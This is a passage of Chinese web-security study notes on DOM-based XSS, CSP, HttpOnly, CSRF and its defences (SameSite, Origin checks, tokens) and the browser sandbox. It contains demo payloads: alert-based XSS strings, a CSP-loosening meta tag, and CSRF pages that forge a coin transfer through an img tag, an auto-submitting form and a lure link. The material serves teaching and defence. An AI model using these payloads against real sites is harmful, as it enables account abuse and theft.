此时，\u0026lt;script\u0026gt;alert('XSS');\u0026lt;/script\u0026gt; 被插入到页面中并被执行，导致 XSS 攻击。\n示例 2：读取 location.hash 导致的 DOM 型 XSS\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Product Search\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026#34;search-results\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; // 获取 location.hash 中的内容 const hash = window.location.hash.substring(1); // 去掉 \u0026#39;#\u0026#39; 符号 // 将 hash 的内容插入到页面中 document.getElementById( \u0026#34;search-results\u0026#34; ).innerHTML = `Searching for: ${hash}`; \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; 攻击者可以构造一个恶意 URL，将恶意 JavaScript 代码注入 location.hash 中：\n1 http://example.com/#\u0026lt;img src=x onerror=alert(\u0026#39;XSS\u0026#39;)\u0026gt; 当用户访问该 URL 时，window.location.hash 的值为 #\u0026lt;img src=x onerror=alert('XSS')\u0026gt;，然后浏览器将执行：\n1 \u0026lt;div id=\u0026#34;search-results\u0026#34;\u0026gt;Searching for: \u0026lt;img src=x onerror=alert(\u0026#39;XSS\u0026#39;)\u0026gt;\u0026lt;/div\u0026gt; 由于 \u0026lt;img\u0026gt; 标签中的 onerror 属性未经过安全处理，浏览器会执行 alert('XSS')。\n建议：\n避免使用不安全的 DOM 操作：尽量避免使用 innerHTML、document.write、outerHTML、eval、setTimeout 等方法，这些方法容易引入恶意代码。使用更安全的替代方案，例如 textContent 或 innerText 来处理用户数据。 阻止 XSS 攻击 储型 XSS 攻击和反射型 XSS 攻击都是需要经过 Web 服务器来处理，因此可以认为这两种类型的漏洞是服务端的安全漏洞。而基于 DOM 的 XSS 攻击全部都是在浏览器端完成的，因此基于 DOM 的 XSS 攻击是属于前端的安全漏洞。\n但无论是何种类型的 XSS 攻击，它们都有一个共同点，那就是首先往浏览器中注入恶意脚本，然后再通过恶意脚本将用户信息发送至黑客部署的恶意服务器上。\n所以要阻止 XSS 攻击，可以通过阻止恶意 JavaScript 脚本的注入和恶意消息的发送来实现。\n常用的阻止 XSS 攻击的策略\n服务器对输入脚本进行过滤或转码 不管是反射型还是存储型 XSS 攻击，都可以在服务器端将一些关键的字符进行转码，比如最典型的：\n1 code:\u0026lt;script\u0026gt;alert(\u0026#39;你被 xss 攻击了\u0026#39;)\u0026lt;/script\u0026gt; 这段代码过滤后，只留下了：\n1 code: 这样，当用户再次请求该页面时，由于\u0026lt;script\u0026gt;标签的内容都被过滤了，所以这段脚本在客户端是不可能被执行的。\n除了过滤之外，服务器还可以对这些内容进行转码，还是上面那段代码，经过转码之后，效果如下所示：\n1 code:\u0026amp;lt;script\u0026amp;gt;alert(\u0026amp;#39; 你被 xss 攻击了 \u0026amp;#39;)\u0026amp;lt;/script\u0026amp;gt; 经过转码之后的内容，如\u0026lt;script\u0026gt;标签被转换为\u0026amp;lt;script\u0026amp;gt;，因此即使这段脚本返回给页面，页面也不会执行这段脚本。\n充分利用 CSP 实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：\n限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；\n禁止向第三方域提交数据，这样用户数据也不会外泄；\n禁止执行内联脚本和未授权的脚本；\n还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。\n使用 HttpOnly 属性 由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护 Cookie 的安全。\n通常服务器可以将某些 Cookie 设置为 HttpOnly 标志，HttpOnly 是服务器通过 HTTP 响应头来设置的，下面是打开 Google 时，HTTP 响应头中的一段：\n1 set-cookie: NID=189=M8q2FtWbsR8RlcldPVt7qkrqR38LmFY9jUxkKo3-4Bi6Qu_ocNOat7nkYZUTzolHjFnwBw0izgsATSI7TZyiiiaV94qGh-BzEYsNVa7TZmjAYTxYTOM9L_-0CN9ipL6cXi8l6-z41asXtm2uEwcOC5oh9djkffOMhWqQrlnCtOI; expires=Sat, 18-Apr-2020 06:52:22 GMT; path=/; domain=.google.com; HttpOnly 顾名思义，使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript (无法通过 document.cookie 是来读取) 来读取这段 Cookie。还可以通过 Chrome 开发者工具来查看哪些 Cookie 被标记了 HttpOnly，如下图：\n通过添加验证码防止脚本冒充用户提交危险操作。 对于一些不受信任的输入，还可以限制其输入长度，可以增大 XSS 攻击的难度。 你认为前端开发者对 XSS 攻击应该负多大责任？\n扩展：\nCSP 是可以通过 meta 标签设置的，如果恶意插入的是关于 CSP 的 meta 设置了？\n如果攻击者能够在你的网页中插入恶意的 \u0026lt;meta\u0026gt; 标签来修改 CSP（内容安全策略），这表明网页已经遭受了 跨站脚本（XSS） 或类似的安全攻击。攻击者插入的恶意 \u0026lt;meta\u0026gt; 标签可以放宽或禁用原有的安全策略，从而进一步扩大攻击范围，例如加载恶意的脚本或窃取用户数据。\nCSP 设置的方式及其风险\nCSP 设置可以通过两种方式实现：\nHTTP 响应头： 服务器端通过设置 Content-Security-Policy HTTP 响应头来定义 CSP 策略。 优点：无法被客户端篡改，因为 HTTP 头部由服务器发送，除非攻击者控制了服务器。 HTML \u0026lt;meta\u0026gt; 标签： 可以在 HTML 文档的 \u0026lt;head\u0026gt; 部分使用 \u0026lt;meta http-equiv=\u0026quot;Content-Security-Policy\u0026quot;\u0026gt; 来内嵌 CSP 策略。 缺点：相较于 HTTP 响应头，使用 \u0026lt;meta\u0026gt; 标签设置 CSP 存在更高的被篡改风险，尤其是在页面内容可以被动态插入的情况下。 恶意插入 \u0026lt;meta\u0026gt; 标签的风险\n放宽或禁用 CSP：如果攻击者能在你的 HTML 文档中插入一个 \u0026lt;meta\u0026gt; 标签来重新定义 CSP，他们可能会放宽 CSP 限制或完全禁用它，例如允许内联脚本（'unsafe-inline'）或者从不可信的来源加载资源。\n1 \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src *; script-src \u0026#39;unsafe-inline\u0026#39; *;\u0026#34;\u0026gt; 上述恶意 \u0026lt;meta\u0026gt; 标签的效果是允许从任何来源加载资源，并允许执行内联脚本。这使得 XSS 攻击或其他恶意行为更容易实现。\n加载恶意资源：通过修改 CSP，攻击者可以指定从他们控制的服务器加载恶意脚本、样式表或其他资源。\n逃避安全检测：如果 CSP 是为了满足某些安全合规性要求（如防止数据泄露），恶意修改 CSP 可以绕过这些安全措施，使得应用程序的数据和用户信息暴露给不可信的第三方。\n如何防止恶意修改 CSP？\n优先使用 HTTP 响应头设置 CSP：\n设置 CSP 的最佳实践是通过服务器端发送的 HTTP 响应头，而不是通过 \u0026lt;meta\u0026gt; 标签。HTTP 响应头设置的 CSP 策略无法被客户端脚本篡改。 1 Content-Security-Policy: default-src \u0026#39;self\u0026#39;; script-src \u0026#39;self\u0026#39;; img-src \u0026#39;self\u0026#39; 防止 XSS 攻击：\n如果攻击者可以插入或修改 \u0026lt;meta\u0026gt;标签，这通常意味着网站存在 XSS 漏洞。为了防止 XSS 攻击，建议采取以下措施： 输入验证和输出编码：确保用户输入的内容在显示前进行适当的验证和编码，避免插入恶意脚本。 使用安全的库和框架：利用现代的前端框架（如 React、Vue、Angular 等）默认的安全机制（如自动转义 HTML）来防止 XSS。 启用 HTTP Only Cookie：通过设置 HttpOnly 标志，防止 JavaScript 访问敏感的 Cookie 信息。 启用子资源完整性 (Subresource Integrity, SRI)：\nSRI 是一种安全特性，用于确保外部资源（如脚本或样式表）未被篡改。使用 SRI，可以验证从可信来源加载的资源的完整性，即使 CSP 被恶意修改，攻击者的脚本也无法成功执行。 1 \u0026lt;script src=\u0026#34;https://example.com/script.js\u0026#34; integrity=\u0026#34;sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxxNsqEC2I=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 利用浏览器扩展保护 CSP 设置：\n某些浏览器扩展和安全工具可以保护 CSP 设置，防止网页被篡改。它们会检查 CSP 并在发现问题时提醒用户或阻止加载不安全的资源。 总结\nCSP 的设置应通过服务器端的 HTTP 响应头来完成，而不是通过 \u0026lt;meta\u0026gt; 标签，这样可以防止客户端的篡改。 如果恶意插入 \u0026lt;meta\u0026gt; 标签来修改 CSP 策略，这意味着网页存在 XSS 或其他严重的安全漏洞，应该优先修复这些安全问题。 采取多层次的安全措施（如 XSS 防护、子资源完整性、内容安全策略等）来确保 Web 应用程序的安全性。 CSRF 攻击 陌生链接不要随便点。\n黑客如何才能拿到你的 cookie？\n浏览网页的时候使用的是 http 协议，而 http 是无状态的协议。\n用户先登录自己的谷歌邮箱，然后 Gmail 服务器返回一些登录状态给 David 的浏览器，这些信息包括了 Cookie、Session 等，这样在 David 的浏览器中，Gmail 邮箱就处于登录状态了。然后打开 Gmail 邮箱中的一份邮件，并点击了该邮件中的一个链接。过了几天，David 就发现他的域名被盗了。后面 David 还是要回了他的域名，也弄清楚了他的域名之所以被盗，就是因为无意间点击的那个链接。\nDavid 的域名被盗流程：\n用户访问某个需要登录的正常网站，并且网站会返回一些登陆状态信息给浏览器存储下来（Cookie、Session） 用户通过在该需要登陆的网站中点击了其他站点的链接并跳转到那个域名下对应的页面中 而黑客提前在这个准备的页面中，伪造一些请求（域名都是用户那个站点的域名）并传一些参数给用户的受信站点去，因为浏览器默认行为是：即使是在别的域名站点（黑客的）下，如果发出针对其他域名的请求，只要当前这个浏览器中已经有了其他域名下的 cookie 等，那么也会读取其他站点下的这些信息，然后自动带着 cookie 等信息去请求对应站点，所以相当于间接获取到用户的登录状态信息，伪造用户的请求到用户登录的那个网站中去进行一些操作 跨站请求伪造 (CSRF, Cross-Site Request Forgery) 攻击的核心原理在于：攻击者诱导用户在登录状态下访问恶意站点，在黑客的网站中，利用用户的登录状态发起跨站请求，然后利用用户的身份认证信息（如 Cookies）来对用户已经登录的网站发起恶意请求。\n通常当用户打开了黑客的页面后，黑客有三种方式去实施 CSRF 攻击。\n例子\n这里假设某个站点具有转账功能，可以通过 POST 或 Get 来实现转账，转账接口如下所示：\n1 2 3 4 5 6 7 8 # 同时支持 POST 和 Get # 接口 https://time.org/sendcoin # 参数 ## 目标用户 user ## 目标金额 number 黑客需要知道的信息：\n请求需要发送到的目标站点及其接口 请求的方式（get 或者 post） 请求时需要发送的数据 1. 自动发起 Get 请求 1 2 3 4 5 6 7 8 这个页面是黑客的恶意页面，比如是在www.hacker.com/index.html页面 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;黑客的站点：CSRF 攻击演示\u0026lt;/h1\u0026gt; \u0026lt;img src=\u0026#34;https://time.geekbang.org/sendcoin?user=hacker\u0026amp;number=100\u0026#34; /\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 黑客页面的 HTML 代码，在这段代码中，黑客将转账的请求接口隐藏在 img 标签内， 欺骗浏览器这是一张图片资源。当该页面被加载时，浏览器会自动发起 img 的资源请求（因为用户的已经在这个站点登陆过，所以浏览器的默认行为是会带着这个站点的登录信息，比如 cookie 发送相应的请求到对应的网站上），如果服务器没有对该请求做判断的话，那么服务器就会认为该请求是一个转账请求，于是用户账户上的 100 极客币就被转移到黑客的账户上去。\n或者：\n2. 自动发起 POST 请求 有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的方式你可以参考下面示例代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;黑客的站点：CSRF 攻击演示\u0026lt;/h1\u0026gt; \u0026lt;form id=\u0026#34;hacker-form\u0026#34; action=\u0026#34;https://time.geekbang.org/sendcoin\u0026#34; method=\u0026#34;POST\u0026#34; \u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;user\u0026#34; value=\u0026#34;hacker\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;number\u0026#34; value=\u0026#34;100\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;script\u0026gt; document.getElementById(\u0026#34;hacker-form\u0026#34;).submit(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 黑客在他的页面中构建了一个隐藏的表单，该表单的内容就是极客时间的转账接口。当用户打开该站点之后，这个表单会被自动执行提交；当表单被提交之后，服务器就会执行转账操作。因此使用构建自动提交表单这种方式，就可以自动实现跨站点 POST 数据提交。\n3. 引诱用户点击链接 还有一种诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接，示例代码如下所示：\n1 2 3 4 5 6 \u0026lt;div\u0026gt; \u0026lt;img width=150 src=\u0026#34;http://images.xuejuzi.cn/1612/1_161230185104_1.jpg\u0026#34;\u0026gt; \u0026lt;/img\u0026gt; \u0026lt;a href=\u0026#34;https://time.geekbang.org/sendcoin?user=hacker\u0026amp;number=100\u0026#34; taget=\u0026#34;_blank\u0026#34; 点击下载美女照片 \u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; 这段黑客站点代码，页面上放了一张美女图片，下面放了图片下载地址，而这个下载地址实际上是黑客用来转账的接口，一旦用户点击了这个链接，那么他的极客币就被转到黑客账户。\n和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。\nCSRF 攻击能造成的影响需要看站点对应的存在漏洞的接口有哪些功能，比如：\n修改用户信息 转账 因为是黑客冒充用户发送的请求，因此是请求伪造（Request Forgery），并且场景设计两个跨域的站点（Cross Site），简称 CSRF 攻击。\n防止 CSRF 攻击 不要访问莫名的网站 使用没有使用过的浏览器（因为没有在这个浏览器中有登录记录） 每次登录后登出网站 交给开发者来防御 以上四种方法。\nCSRF 攻击的一些“特征”，发起 CSRF 攻击的三个必要条件：\n目标站点一定要有 CSRF 漏洞； 用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态； 需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。 黑客是无法通过 CSRF 攻击来获取用户页面数据的；其最关键的一点是要能找到服务器的漏洞，所以说对于 CSRF 攻击主要的防护手段是提升服务器的安全性。\n防止 CSRF 攻击的手段：\n利用好 Cookie 的 SameSite 属性 黑客会利用用户的登录状态来发起 CSRF 攻击，而 Cookie 正是浏览器和服务器之间维护登录状态的一个关键数据，因此要阻止 CSRF 攻击， 我们首先就要考虑在 Cookie 上来做文章。\n通常 CSRF 攻击都是从第三方站点发起的，要防止 CSRF 攻击，我们最好能实现从第三方站点发送请求时禁止 Cookie 的发送，因此在浏览器通过不同来源发送 HTTP 请求时，有如下区别：\n如果是从第三方站点发起的请求，那么需要浏览器禁止发送某些关键 Cookie 数据到服 务器； 如果是同一个站点发起的请求，那么就需要保证 Cookie 数据正常发送。 Cookie 中的 SameSite 属性正是为了解决这个问题的，通过使用 SameSite 可以有效地降低 CSRF 攻击的风险。\nSameSite 是怎么防止 CSRF 攻击的呢？\nHTTP是没有状态的，但为了保存状态，网景公司发明了cookie用来记录用户的状态信息。但是存在一个弊端，就是我们网站 A 的cookie可以作为第三方网站的cookie去使用。这样就造成了CSRF的漏洞。SameSite就可以限制第三方cookie的使用。\n在 HTTP 响应头中，通过 set-cookie 字段设置 Cookie 时，可以带上 SameSite 选项，如下：\n1 Set-Cookie: CookieName=CookieValue; SameSite=strict; SameSite 选项通常有 Strict、Lax 和 None 三个值。\nStrict：完全禁止第三方 Cookie，也就是在跨站时，均不会携带cookie,只有当前站点的url和访问的站点的url一致时，才能携带cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。\n作者回复: 我把整个流程写一遍：\n首先假设你发出登录 InfoQ 的站点请求，然后在 InfoQ 返回 HTTP 响应头给浏览器，InfoQ 响应头中的某些 set-cookie 字段如下所示：\nset-cookie: a_value=avalue_xxx; expires=Thu, 21-Nov-2019 03:53:16 GMT; path=/; domai n=.infoq.com; SameSite=strict\nset-cookie: b_value=bvalue_xxx; expires=Thu, 21-Nov-2019 03:53:16 GMT; path=/; domai n=.infoq.com; SameSite=lax\nset-cookie: c_value=cvaule_xxx; expires=Thu, 21-Nov-2019 03:53:16 GMT; path=/; domai n=.infoq.com; SameSite=none\nset-cookie: d_value=dvaule_xxxx; expires=Thu, 21-Nov-2019 03:53:16 GMT; path=/; dom ain=.infoq.com; 我们可以看出，\na_value 的 SameSite 属性设置成了 strict，\nb_value 的 SameSite 属性设置成了 lax\nc_value 的 SameSite 属性值设置成了 none\nd_value 没有设置 SameSite 属性值\n好，这些 Cookie 设置好之后，当你再次在 InfoQ 的页面内部请求 InfoQ 的资源时，这些 Cookie 信 息都会被附加到 HTTP 的请求头中，如下所示： cookie: a_value=avalue_xxx;b_value=bvalue_xxx;c_value=cvaule_xxx;d_value=dvaule_xxxx;\n但是，假如你从 time.geekbang.org 的页面中，通过 a 标签打开页面，如下所示：\u0026lt;a href=\u0026quot;https://www.infoq.cn/sendcoin?user=hacker\u0026amp;number=100\u0026quot;\u0026gt;点我下载\u0026lt;/a\u0026gt;(https://www.infoq.cn/sendcoin?user=hacker\u0026amp;number=100)当用户点击整个链接的时候，因为 InfoQ 中 a_vaule 的 SameSite 的值设置成了 strict，那么 a_vaule 的值将不会被携带到这个请求的 HTTP 头中。\n如果 time.geekbang.org 的页面中，有通过 img 来加载的 infoq 的资源代码，如下所示：\n\u0026lt;img src=\u0026quot;https://www.infoq.cn/sendcoin?user=hacker\u0026amp;number=100\u0026quot; \u0026gt;\n那么在加载 infoQ 资源的时候，只会携带 c_value,和 d_value 的值。\nLax：在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法， 或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。\n导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。\n请求类型 示例 正常情况 Lax 链接 \u0026lt;a href=\u0026quot;...\u0026quot;\u0026gt;\u0026lt;/a\u0026gt; 发送 Cookie 发送 Cookie 预加载 \u0026lt;link rel=\u0026quot;prerender\u0026quot; href=\u0026quot;...\u0026quot;/\u0026gt; 发送 Cookie 发送 Cookie GET 表单 \u0026lt;form method=\u0026quot;GET\u0026quot; action=\u0026quot;...\u0026quot;\u0026gt; 发送 Cookie 发送 Cookie POST 表单 \u0026lt;form method=\u0026quot;POST\u0026quot; action=\u0026quot;...\u0026quot;\u0026gt; 发送 Cookie 不发送 iframe \u0026lt;iframe src=\u0026quot;...\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt; 发送 Cookie 不发送 AJAX $.get(\u0026quot;...\u0026quot;) 发送 Cookie 不发送 Image \u0026lt;img src=\u0026quot;...\u0026quot;\u0026gt; 发送 Cookie 不发送 设置了Strict或Lax以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。\nNone，在任何情况下都会发送 Cookie 数据 对于防范 CSRF 攻击，可以针对实际情况将一些关键的 Cookie 设置为 Strict 或者 Lax 模式，这样在跨站点请求时，这些关键的 Cookie 就不会被发送到服务器，从而使得黑客的 CSRF 攻击失效。\n验证请求的来源站点 在服务器端验证请求来源的站点。由于 CSRF 攻击大多来自于第三方站点，因此服务器可以禁止来自第三方站点的请求。那么该怎么判断请求是否来自第三方站点呢？\n通过 HTTP 请求头中的 Referer 和 Origin 属性。\nReferer 是 HTTP 请求头中的一个字段，记录了该 HTTP 请求的来源地址。比如我从极客 时间的官网打开了 InfoQ 的站点，那么请求头中的 Referer 值是极客时间的 URL，如下 图：\n虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值，具 体可参考 Referrer Policy。\n但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了 Origin 属 性，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性，如下图：\nOrigin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细 路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。\n因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际 情况判断是否使用 Referer 值。\nCSRF Token 核心原理是通过验证请求是否携带合法且唯一的 Token，确保请求是由用户主动且明确发起的，而非被恶意网站伪造的。\nCSRF Token 的核心思想\n唯一性：为每个用户会话或请求生成一个随机且不可预测的 Token。 关联性：Token 与用户当前会话（Session）绑定。 验证性：服务器要求客户端在发起敏感请求时必须提交此 Token，否则拒绝请求。 CSRF Token 的生成和绑定方式可以根据具体实现有所不同，但核心思想是 确保每个敏感请求（或会话）携带一个唯一且不可预测的 Token。\n1. CSRF Token 的生成时机\nCSRF Token 的生成和绑定通常有两种模式，具体取决于安全需求：\n模式 A：会话级 Token（Session-based Token）\n生成时机：在用户 登录时 或 首次访问敏感页面时 生成。 唯一性：同一个用户会话（Session）中，Token 保持不变，直到会话过期或重新生成。 验证逻辑：服务器将 Token 存储在 Session 中，后续所有请求只需验证 Token 是否与 Session 中的一致。 适用场景：适用于一般安全需求的系统，实现简单。 模式 B：请求级 Token（Per-Request Token）\n生成时机：每次页面加载（或每次请求） 时生成新 Token。 唯一性：每个页面或请求的 Token 完全不同，且通常一次性有效（使用后立即失效）。 验证逻辑：服务器需要记录最近生成的有效 Token（如存储在缓存中），验证后立即标记为失效。 适用场景：对安全性要求极高的系统（如金融操作），但实现复杂，可能影响用户体验（如浏览器后退按钮失效）。 每次访问页面生成 Token\n如果系统设计为 请求级 Token（模式 B），那么：\n用户每次访问页面时，服务器生成一个新的唯一 Token。 该 Token 仅对本次页面访问后的首次提交有效（例如提交表单时）。 如果用户刷新页面，会生成新的 Token，旧 Token 失效。 这种设计下，Token 的生命周期极短，安全性更高，但需要解决以下问题：\n服务器存储压力：需记录大量短期有效的 Token（可通过加密签名解决，如 JWT）。 用户并行操作：例如打开多个标签页提交表单，需确保每个标签页的 Token 独立有效。 实际常见实现\n大多数系统采用 会话级 Token（模式 A）的折中方案：\n用户登录时生成一个 Token，存入 Session。 该 Token 在整个会话期间有效，直到用户注销或 Session 过期。 所有敏感请求（如 POST 请求）均验证此 Token。 这种模式平衡了安全性和实现复杂度，但需注意：\n如果 Token 泄露（如被 XSS 攻击窃取），攻击者仍可伪造请求。 因此，需结合其他安全措施（如设置 Cookie 的 SameSite 属性、输入验证等）。 示例对比\n场景 1：会话级 Token\n用户登录 → 生成 Token ABC，存入 Session。 用户访问表单页 → 页面中嵌入 Token ABC。 用户提交表单 → 携带 Token ABC，服务器验证通过。 用户刷新表单页 → Token 仍为 ABC（未重新生成）。 场景 2：请求级 Token\n用户访问表单页 → 生成 Token XYZ，存入缓存。 用户提交表单 → 携带 Token XYZ，服务器验证后标记为失效。 用户刷新表单页 → 生成新 Token 123，旧 Token XYZ 失效。 工作流程 生成 Token\n用户登录时，服务器生成一个随机 Token（如 a1b2c3d4e5），存储在服务器端的（如 Session）或加密的 Cookie 中。 服务器将 Token 嵌入到返回给用户的页面中（如表单的隐藏字段、HTTP 响应头等）。 客户端携带 Token\n用户在提交表单或发起敏感请求（如 POST 请求）时，必须携带此 Token。例如：\n1 2 3 4 \u0026lt;form action=\u0026#34;/transfer\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf_token\u0026#34; value=\u0026#34;a1b2c3d4e5\u0026#34; /\u0026gt; \u0026lt;!-- 其他表单字段 --\u0026gt; \u0026lt;/form\u0026gt; 运行 HTML\n或在 AJAX 请求的 HTTP 头中添加 Token：\n1 2 3 headers: { \u0026#39;X-CSRF-Token\u0026#39;: \u0026#39;a1b2c3d4e5\u0026#39; } 服务器验证 Token\n服务器收到请求后，从请求参数或头中提取 Token，并与服务器存储的 Token 比对。 如果 Token 匹配且未过期，请求被视为合法；否则拒绝执行操作。 关键设计要点 不可预测性：Token 必须使用安全的随机数生成（如加密算法），防止攻击者猜测。 会话绑定：Token 通常与用户 Session 关联，每个会话或请求独立生成。 安全传输：服务端的 CSRF Token 不能通过 Cookie 传输（避免与 CSRF 攻击的 Cookie 自动携带冲突），应通过表单字段、HTTP 头等方式传递。 短期有效：Token 可设置为一次性使用或短期有效，增强安全性。 第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实 就是服务器生成的字符串，然后将该字符串植入到返回的页面中。你可以参考下面示例代 码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 !DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;form action=\u0026#34;https://time.geekbang.org/sendcoin\u0026#34; method=\u0026#34;POST\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;nc98P987bcpncYhoadjoiydc9aj\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;user\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;number\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; /\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 第二步，在浏览器端如果要发起转账的请求，那么需要带上页面中的 CSRF Token，然后服 务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法实时获取到新的 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。\n如果是 CSRF 攻击，那么黑客是拿不到受害者站点数据的。\n但是黑客会在他的 A 站点中调用受害者 B 站点的 http 接口，这些接口可以是转账，删帖或者设置等。\n这个过程中你需要注意一点，在黑客 A 站点中调用受害者 B 站点的 http 接口时，默认情况下，浏览器依然会把受害者的 Cookie 等信息数据发送到受害者的 B 站点，【注意这里并不是黑客的 A 站点】。\n如果 B 站点存在漏洞的话，那么黑客就会攻击成功，比如将受害者的金币转出去！\n安全沙箱 页面安全和操作系统安全之间的关系。\n浏览器架构是如何影响到操作系统安全的。\n单进程浏览器自身的软件漏洞，在这些漏洞没有被及时修复的情况下，黑客就有可能通过恶意的页面向浏览器中注入恶意程序， 其中最常见的攻击方式是利用缓冲区溢出。这种类型的攻击和 XSS 注入的脚本是不一样的。\nXSS 攻击只是将恶意的 JavaScript 脚本注入到页面中，虽然能窃取一些 Cookie 相关的数据，但是 XSS 无法对操作系统进行攻击。\n而通过浏览器漏洞进行的攻击是可以入侵到浏览器进程内部的，可以读取和修改浏览器进程内部的任意内容，还可以穿透浏览器，在用户的操作系统上悄悄地安装恶意软件、 监听用户键盘输入信息以及读取用户硬盘上的文件内容。（危害最大）。整个操作系统的内容都暴露给黑客。\n现代浏览器采用了多进程架构，将渲染进程和浏览器主进程做了分离，不仅是稳定性考虑，也有安全考虑。\n从操作系统安全的视角来看看浏览器的多进程架构，如下图：\n浏览器被划分为浏览器内核和渲染内核两个核心模块，其中浏览器内核是由网络进程、浏览器主进程和 GPU 进程等组成的，渲染内核就是渲染进程。\n在浏览器中打开一个页面，这两个模块是怎么配合的？\n所有的网络资源都是通过浏览器内核来下载的，下载后的资源会通过 IPC 将其提交给渲染进程（浏览器内核和渲染进程之间都是通过 IPC 来通信的）。然后渲染进程会对这些资源进行解析、绘制等操作，最终生成一幅图片。但是渲染进程并不负责将图片显示到界面上， 而是将最终生成的图片提交给浏览器内核模块，由浏览器内核模块负责显示这张图片。\n为什么一定要通过浏览器内核去请求资源，再将数据转发给渲染进程，而不直接从渲染进程内部去请求网络资源？\n为什么渲染进程只负责生成页面图片，生成图片还要经过 IPC 通知浏览器内核模块，然 后让浏览器内核去负责展示图片？\n通过以上方式不是增加了工程的复杂度吗？\n要解释现代浏览器为什么要把这个流程弄得这么复杂，就得从系统安全的角度来分析。\n安全沙箱\n由于渲染进程需要执行 DOM 解析、CSS 解析、网络图片解码等操作，如果渲染进程中存在系统级别的漏洞，那么以上操作就有可能让恶意的站点获取到渲染进程的控制权限，进而又获取操作系统的控制权限。\n因为网络资源的内容存在着各种可能性，所以浏览器会默认所有的网络资源都是不可信的， 都是不安全的。但谁也不能保证浏览器不存在漏洞，只要出现漏洞，黑客就可以通过网络内容对用户发起攻击。\n如果你下载了一个恶意程序，但是没有执行它，那么恶意程序是不会生效的。同 理，网络内容对于浏览器也是如此，浏览器可以安全地下载各种网络资源，但是如果要执行这些网络资源，比如解析 HTML、解析 CSS、执行 